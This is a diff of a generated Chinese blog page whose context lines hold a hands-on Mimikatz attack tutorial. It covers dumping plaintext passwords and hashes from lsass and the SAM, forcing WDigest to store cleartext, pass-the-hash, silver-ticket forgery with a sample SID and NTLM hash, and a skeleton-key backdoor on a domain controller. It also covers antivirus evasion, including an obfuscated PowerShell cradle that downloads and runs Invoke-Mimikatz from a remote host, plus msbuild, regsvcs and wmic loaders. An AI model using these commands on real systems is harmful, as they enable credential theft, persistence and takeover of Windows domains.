@@ -120,40 +120,65 @@
 <h3 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h3><p>首先将执行权限提升为debug权限</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103351984.png" alt="image-20211103103351984"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103351984.png" class title="image-20211103103351984">
+
+
+
 <p>使用sekurlsa模块抓取明文密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103420451.png" alt="image-20211103103420451"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103420451.png" class title="image-20211103103420451">
+
+
+
 <p>注:当目标为win10或2012R2以上时，默认禁止在内存中保存明文密码，但可以通过修改注册表的方式来抓取明文。</p>
 <p>修改命令如下:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Sec urityProviders\WDigest  /v UseLogonCredential /t REG_DWORD  /d  1  /f</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103105046333.png" alt="image-20211103105046333"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103105046333.png" class title="image-20211103105046333">
+
+
+
 <h3 id="SAM表离线获取hash"><a href="#SAM表离线获取hash" class="headerlink" title="SAM表离线获取hash"></a>SAM表离线获取hash</h3><p>导出SAM数据库的数据</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg  save  HKLM\SYSTEM  SYSTEM(自定义名称)</span><br><span class="line"></span><br><span class="line">reg  save  HKLM\SAM SAM(自定义名称)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110249663.png" alt="image-20211103110249663"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110249663.png" class title="image-20211103110249663">
+
+
+
 <p>提取导出SAM数据中的hash(确保Mimikatz和导出文件在同一目录下或者指定SAM数据的绝对/相对路径)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:SAM(自定义名称)  /system:SYSTEM(自定义名称)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110638898.png" alt="image-20211103110638898"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110638898.png" class title="image-20211103110638898">
+
+
+
 <h2 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h2><hr>
 <p>当mimikatz无法在目标主机上正常运行时，可以使用微软提供的工具Procdump导出lsass.exe进程</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procsump64.exe -accepteula -ma lsass.exe  lsass.tmp</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103111347692.png" alt="image-20211103111347692"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103111347692.png" class title="image-20211103111347692">
+
+
+
 <p>使用 mimikatz的sekurlsa模块对导出的lsass.dmp文件。先使用minidump恢复到lsass.exe的状态，然后使用logonpasswords导出明文密码信息</p>
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103113844380.png" alt="image-20211103113844380"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103113844380.png" class title="image-20211103113844380">
+
+
+
 <p>可看到passwords.txt文档中系统的明文密码信息</p>
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103115851943.png" alt="image-20211103115851943"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103115851943.png" class title="image-20211103115851943">
+
+
+
 <h2 id="哈希传递攻击PTH"><a href="#哈希传递攻击PTH" class="headerlink" title="哈希传递攻击PTH"></a>哈希传递攻击PTH</h2><hr>
 <h3 id="工作组环境"><a href="#工作组环境" class="headerlink" title="工作组环境"></a>工作组环境</h3><p>当我们获取到某一台主机中用户的NTLM哈希值时，可以直接将获取到的NTLM哈希值登录目标主机</p>
 <p>命令；</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa:pt /user:用户名   /domain:ip地址    /ntlm:用户的ntlm哈希值</span><br></pre></td></tr></table></figure>
 
 <p>如下所示，我们可以直接登录目标主机cmd管理窗口，执行命令</p>
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103130911394.png" alt="image-20211103130911394"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103130911394.png" class title="image-20211103130911394">
+
 <p>注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令</p>
 <h3 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h3><p>在域环境下，如果获取到某一用户的ntlm哈希值，可以在域环境下任意主机登录用户，若获取到域控 管理员的账号和ntlm哈希值即可 登录域控。</p>
 <p>命令:</p>
@@ -188,10 +213,14 @@
 <p>提升权限，获取主机账号的哈希值</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103161547663.png" alt="image-20211103161547663"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103161547663.png" class title="image-20211103161547663">
+
 <p>这里的liukaifeng01的SID为S-1-5-21-295270202-1353902439-2381782089(不要后面的-1000)</p>
 <p>伪造的OWA的NTLM哈希为84883cf100e1f84e2a2468f08d6d0e4f</p>
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162043108.png" alt="image-20211103162043108"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162043108.png" class title="image-20211103162043108">
+
+
+
 <p>生成白银票据命令 :</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:[domain] /sid:[SID] /target:服务用户.xxx.com /rc4:[server&#x27;s Hash] /service:[service] /user:[username] /ptt</span><br></pre></td></tr></table></figure>
 
@@ -200,10 +229,12 @@
 <p>如下:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:GOD /sid:S-1-5-21-295270202-1353902439-2381782089( /target:OWA.GOD.com /rc4:84883cf100e1f84e2a2468f08d6d0e4f /service:cifs /user:liukaifeng01 /ptt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162850526.png" alt="image-20211103162850526"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162850526.png" class title="image-20211103162850526">
+
 <p>可以看到此时的liukaifeng01的key变成了OWA的，服务为cifs，生成了获取cifs的白银票据</p>
 <p>伪造白银票据后，我们就可以远程访问DC</p>
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103163128580.png" alt="image-20211103163128580"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103163128580.png" class title="image-20211103163128580">
+
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注:若使用dir \\主机名\c$不能访问，则输入主机全名dir \\主机名.域名.com\c$</span><br></pre></td></tr></table></figure>
 
 
@@ -212,7 +243,10 @@
 <p>在域控上安装skeleton key</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;misc::skeleton&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103171351475.png" alt="image-20211103171351475"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103171351475.png" class title="image-20211103171351475">
+
+
+
 <p>在域内其他机器使用skeleton key去访问域控，添加密码围殴mimikatz</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net  use   \\主机名.xxx.com\c$  mimikatz(密码)  /user:adtest \administrator</span><br></pre></td></tr></table></figure>
 
@@ -222,7 +256,10 @@
 <p>但mimikatz依然可以绕过，需要导入mimidrv.sys文件，命令如下:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect /process:lsass.exe /remove </span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103172059633.png" alt="image-20211103172059633"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103172059633.png" class title="image-20211103172059633">
+
+
+
 <h2 id="免杀处理"><a href="#免杀处理" class="headerlink" title="免杀处理"></a>免杀处理</h2><hr>
 <h3 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h3><p>在powershell中导入invoke-Mimikatz.ps1，加载mimikatz模块</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass “import-module .Invoke-Mimikatz.ps1”</span><br></pre></td></tr></table></figure>
@@ -230,16 +267,24 @@
 <p>运行mimikazt模块</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass “invoke-Mimikatz”</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103194723187.png" alt="image-20211103194723187"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103194723187.png" class title="image-20211103194723187">
+
 <p>在cmd中运行过程中没有被拦截</p>
 <p>使用poweshell加载远程服务器的ps脚本，会被360拦截</p>
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200143717.png" alt="image-20211103200143717"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200143717.png" class title="image-20211103200143717">
+
+
+
 <p>稍微做了简单的混淆</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot; (&#x27;IEX &#x27;+&#x27;(Ne&#x27;+&#x27;w-O&#x27;+&#x27;bject Ne&#x27;+&#x27;t.W&#x27;+&#x27;ebClien&#x27;+&#x27;t).Do&#x27;+&#x27;wnloadS&#x27;+&#x27;trin&#x27;+&#x27;g&#x27;+&#x27;(&#x27;+&#x27;1vchttp://&#x27;+&#x27;192.168.211&#x27;+&#x27;.1/&#x27;+&#x27;Inv&#x27;+&#x27;oke-Mimik&#x27;+&#x27;a&#x27;+&#x27;tz.&#x27;+&#x27;ps11v&#x27;+&#x27;c)&#x27;+&#x27;;&#x27;+&#x27;I&#x27;+&#x27;nvoke-Mimika&#x27;+&#x27;tz&#x27;).REplaCE(&#x27;1vc&#x27;,[STRing][CHAR]39)|IeX&quot;</span><br></pre></td></tr></table></figure>
 
 <p>还是被拦截</p>
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200627835.png" alt="image-20211103200627835"></p>
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200702681.png" alt="image-20211103200702681"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200627835.png" class title="image-20211103200627835">
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200702681.png" class title="image-20211103200702681">
+
+
+
 <p>所以最好将Invoke-Mimikatz.ps1文件放置在目标主机上执行powershell加载模块运行imikatz</p>
 <h3 id="使用-net2-0"><a href="#使用-net2-0" class="headerlink" title="使用.net2.0"></a>使用.net2.0</h3><p>首先下载<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/ssssanr/Mimikatz-Csharp/master/katz.cs">katz.cs</a>，将katz.cs文件保存到本地</p>
 <p>并放在对应的系统版本的Framework目录中</p>
@@ -250,29 +295,41 @@
 <p>然后在powershell中执行命令生成key.snk</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$key=&#x27;BwIA AAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z 6 4cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5cl HIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&#x27;</span><br><span class="line"></span><br><span class="line">$Content = [System.Convert]::FromBase64String($key)</span><br><span class="line"></span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202206247.png" alt="image-20211103202206247"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202206247.png" class title="image-20211103202206247">
+
+
+
 <p>最后生成mimikatz，在运行mimikatz</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">32位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br><span class="line">64位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.5072 7&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
 <p>在运行时被360发现啦，火绒没有反应</p>
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202433218.png" alt="image-20211103202433218"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202433218.png" class title="image-20211103202433218">
+
+
+
 <h3 id="使用-net4-0"><a href="#使用-net4-0" class="headerlink" title="使用.net4.0"></a>使用.net4.0</h3><p>下载[mimikatz.xml](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes</a> mimikatz.xml)，将其保存在Framework64文件下的v4,0文件下并运行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msbuild.exe mimikatz.xml</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103203026847.png" alt="image-20211103203026847"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103203026847.png" class title="image-20211103203026847">
+
 <p>360和火绒都没有报毒和进行拦截</p>
 <h3 id="js加载mimikatz"><a href="#js加载mimikatz" class="headerlink" title="js加载mimikatz"></a>js加载mimikatz</h3><p>下载<a target="_blank" rel="noopener" href="https://gist.github.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js">katz.js</a>，执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scsript mimikatz.js</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204511543.png" alt="image-20211103204511543"></p>
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204537821.png" alt="image-20211103204537821"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204511543.png" class title="image-20211103204511543">
+
+
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204537821.png" class title="image-20211103204537821">
+
 <p>360拦截了，火绒没绕过</p>
 <h3 id="jscript的xsl版"><a href="#jscript的xsl版" class="headerlink" title="jscript的xsl版"></a>jscript的xsl版</h3><p>本地加载mimikatz.xsl文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic os get /format:&quot;mimikatz.xsl&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204250467.png" alt="image-20211103204250467"></p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204250467.png" class title="image-20211103204250467">
+
 <p>360和火绒都没有拦截</p>
 <h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><hr>
 <h3 id="导出chrome中的密码"><a href="#导出chrome中的密码" class="headerlink" title="导出chrome中的密码"></a>导出chrome中的密码</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&mid=2247483949&idx=1&sn=db4853c88e4bf0a550c095d9017a363c&chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&mpshare=1&scene=23&srcid=&sharer_sharetime=1582350092849&sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd">使用mimikatz导出chrome中的密码 (qq.com)</a></p>
